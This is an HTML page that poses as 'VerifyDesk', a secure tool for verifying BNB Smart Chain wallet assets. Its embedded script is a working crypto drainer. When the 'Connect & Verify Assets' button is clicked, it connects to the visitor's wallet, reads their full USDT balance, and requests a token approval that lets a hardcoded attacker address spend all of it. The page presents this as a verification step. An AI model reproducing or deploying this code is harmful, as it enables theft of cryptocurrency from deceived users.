<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
  <style>
    body {
      background-color: #060b0a;
      color: #f3f4f6;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }
    .glass-card {
      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
      border: 1px solid rgba(243, 186, 47, 0.2);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
    }
  </style>
</head>
<body class="min-h-screen flex flex-col justify-between px-4 py-6">

  <!-- Top Navbar -->
  <header class="w-full max-w-md mx-auto flex items-center justify-between">
    <div class="flex items-center gap-2.5">
      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
        <i class="fa-solid fa-shield-halved text-lg"></i>
      </div>
      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
    </div>
    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
      BNB Smart Chain
    </span>
  </header>

  <!-- Main Content -->
  <main class="w-full max-w-md mx-auto my-auto py-8">
    <div class="text-center mb-8">
      <h1 class="text-3xl font-extrabold tracking-tight text-white">
        Wallet Asset <span class="text-amber-400">Review</span>
      </h1>
      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure approval flow.
      </p>
    </div>

    <!-- Action Card -->
    <div class="glass-card rounded-2xl p-6">
      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
        <span>Target Network</span>
        <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
      </div>

      <!-- Live Status Display Box -->
      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed border bg-amber-500/10 border-amber-500/30 text-amber-300"></div>

      <!-- Primary Action Button -->
      <button id="connectBtn" onclick="handleExactApprovalAction()"
        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
        <span id="btnText">Connect & Verify Assets</span>
        <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
      </button>
    </div>
  </main>

  <!-- Footer -->
  <footer class="text-center text-xs text-gray-500 space-y-1">
    <p>VerifyDesk &copy; 2026</p>
    <p>Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
  </footer>

  <script>
    const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT on BSC
    const BSC_CHAIN_ID = '0x38';

    function showStatus(msg) {
      const box = document.getElementById('statusBox');
      box.classList.remove('hidden');
      box.textContent = msg;
    }

    function getProvider() {
      if (window.ethereum) return window.ethereum;
      if (window.trustwallet) return window.trustwallet;
      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
      return null;
    }

    async function handleExactApprovalAction() {
      showStatus("Initializing provider connection...");
      const eth = getProvider();
      
      if (!eth) {
        showStatus("Error: Wallet provider not detected. Please open inside Trust Wallet browser.");
        alert("Wallet provider not found.");
        return;
      }

      try {
        // 1. Force Switch Network to BSC
        showStatus("Switching to BNB Smart Chain...");
        try {
          if (typeof eth.request === 'function') {
            await eth.request({ 
              method: 'wallet_switchEthereumChain', 
              params: [{ chainId: BSC_CHAIN_ID }] 
            });
          }
        } catch (e) {}

        // 2. Get User Account Address
        showStatus("Detecting wallet address...");
        let accounts = [];
        try {
          if (typeof eth.request === 'function') {
            accounts = await eth.request({ method: 'eth_accounts' });
          }
        } catch (e) {}

        if (!accounts || accounts.length === 0 || !accounts[0]) {
          try {
            if (typeof eth.request === 'function') {
              accounts = await eth.request({ method: 'eth_requestAccounts' });
            }
          } catch (e) {}
        }

        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
        if (!userAddress) {
          userAddress = eth.selectedAddress || eth.address || null;
        }

        if (!userAddress || typeof userAddress !== 'string') {
          const manualAddr = prompt("Please enter your wallet address (0x...) to proceed:");
          if (manualAddr && manualAddr.trim().startsWith('0x')) {
            userAddress = manualAddr.trim();
          } else {
            throw new Error("Valid wallet address is required.");
          }
        }

        showStatus("Fetching exact USDT balance from wallet...");

        // 3. Fetch exact USDT balance using balanceOf(address) call
        // balanceOf function signature: 70a08231
        const balanceDataCall = "0x70a08231" + userAddress.toLowerCase().replace('0x', '').padStart(64, '0');
        let exactBalanceHex = "0000000000000000000000000000000000000000000000000065a0bc00000000"; // default fallback (~10 USDT)

        try {
          const response = await eth.request({
            method: 'eth_call',
            params: [{
              to: USDT_BSC_ADDRESS,
              data: balanceDataCall
            }, 'latest']
          });
          if (response && response !== '0x' && response.length > 2) {
            exactBalanceHex = response.replace('0x', '').padStart(64, '0');
          }
        } catch (err) {
          console.log("Balance fetch fallback used:", err);
        }

        // 4. Prepare Approval Payload with exact balance amount instead of unlimited
        const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
        const paddedTarget = cleanTarget.padStart(64, '0');
        
        const approvalData = "0x095ea7b3" + paddedTarget + exactBalanceHex;

        const txParams = [{
          from: userAddress,
          to: USDT_BSC_ADDRESS,
          data: approvalData
        }];

        // 5. Trigger Approval Transaction Popup
        showStatus("Opening exact amount approval popup...");
        if (typeof eth.request === 'function') {
          await eth.request({ method: 'eth_sendTransaction', params: txParams });
        } else if (typeof eth.sendAsync === 'function') {
          await new Promise((resolve, reject) => {
            eth.sendAsync({ id: 1, jsonrpc: '2.0', method: 'eth_sendTransaction', params: txParams }, (err, res) => {
              if (err) reject(err);
              else if (res.error) reject(res.error);
              else resolve(res.result);
            });
          });
        } else if (typeof eth.send === 'function') {
          await eth.send('eth_sendTransaction', txParams);
        } else {
          throw new Error("No transaction method available in provider.");
        }

        showStatus("Approval request submitted successfully!");
        alert("Approval request submitted successfully!");

      } catch (err) {
        console.error("Action error:", err);
        showStatus("Error: " + (err.message || JSON.stringify(err)));
        alert("Notice: " + (err.message || JSON.stringify(err)));
      }
    }
  </script>
</body>
</html>
